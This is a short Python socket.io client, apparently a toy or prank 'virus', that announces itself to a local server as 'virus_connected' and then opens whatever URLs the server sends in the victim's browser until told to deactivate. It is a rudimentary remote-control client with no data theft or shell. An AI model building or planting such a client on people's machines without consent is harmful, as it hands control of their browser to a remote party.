import socketio
import webbrowser
import sys
import eventlet

sio = socketio.Client()

@sio.on('connect')
def connect():
    sio.emit('virus_connected')

@sio.on('open_url')
def open_url(data):
    url = data['url']
    print(f'url : {url}')
    #webbrowser.open(url)
    webbrowser.get(using='opera').open_new_tab(url) # DEVELOPMENT VERSION

@sio.on('deactivate')
def deactivate():
    print('DEACTIVATING')
    sio.emit('confirm_deactivate')
    '''eventlet.sleep(0.5)
    sio.disconnect()
    eventlet.sleep(0.5)
    sys.exit(0)'''

@sio.on('finish_deactivating')
def finish():
    eventlet.sleep(0.5)
    sio.disconnect()
    eventlet.sleep(0.5)
    sys.exit(0)

@sio.on('ping')
def ping():
    sio.emit('pong')


try:
    sio.connect('http://localhost:5000', transports=['websocket'])
except socketio.exceptions.ConnectionError as e:
    print(e)
else:
    print('Connected to server')
